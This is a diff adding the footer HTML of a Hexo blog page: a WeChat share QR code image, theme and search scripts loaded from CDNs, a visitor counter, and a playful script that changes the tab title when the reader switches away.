+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABu0lEQVR42u3aO47DMAwFwNz/0tk2jZ1HUlK8wKgKAlseNQQ/er3i9f5Yn/9c/a7+s3jh4uKOue/blXOTzyf7Xz2Di4t7nnu19f0z9/v0Dv/FhouL+0huNWBN9sTFxf0v3Gp6VC2lcHFxn8NNip/kk0mBdKhWw8XFHXDzLuW+31v6u7i4uC3uu7iqhc3ahYuLe4Y7aXP0EpEF7RVcXNwj3LzxUW2RVHdIPLi4uLu5+RaTz1fTo8vD4+LiHuEm8SEfcuTtj0lYxMXF3c29L2DyADQ5UiFE4uLi/pS7NinJW65RKwQXF/cId8cgthe2vryFi4t7hHs/EE3SjryMmdymiF7DxcXdwK0WM0lK1IOWByq4uLhHuM22RXDgfPRy+QwuLu5Bbo7IA1+CyC964uLinucmn+kNTqrXOkdtU1xc3KXc+ZA1P9ik8YqLi7ub+y6uahs0T4+iIgoXF/cId0HC0RqiVFuuZTQuLu6YmwSvpGnSG8zkyRMuLu557r6Rah7amrURLi7uI7l562RB/oWLi/tgbt4o6bU5LpMqXFzcg9yk+KlenpikSri4uL/l7qs4eg3W3sUvXFzcRdw/11rsC4AvaLAAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '不想看就别看了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '你还敢回来！';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
